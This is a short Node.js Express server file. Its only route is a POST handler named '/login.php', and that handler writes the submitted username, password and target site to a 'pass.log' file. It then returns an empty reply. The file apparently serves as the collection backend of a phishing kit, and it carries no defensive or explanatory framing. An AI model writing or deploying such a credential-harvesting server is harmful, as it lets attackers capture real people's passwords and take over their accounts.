'use strict';

var http=require('http')
  , express=require('express')
  , bodyparser=require('body-parser')
  , app=express()
  , server=require('http').Server(app)
  , join=require('path').join
  , fs=require('fs')

// async methods
app.set('port',process.env.PORT||3000);
app.disable('x-powered-by');
app.use(bodyparser.urlencoded());

app.post('/login.php',function(request,response){
    var message=request.body.user+':'+request.body.pass+':'+request.body.site+'\n';
    fs.appendFile(join(__dirname,'..','pass.log'),message,function(err){});
    response.send();
});

server.listen(app.get('port'),function(){
    console.log('Express server listening on port '+app.get('port'));
});

module.exports=app;

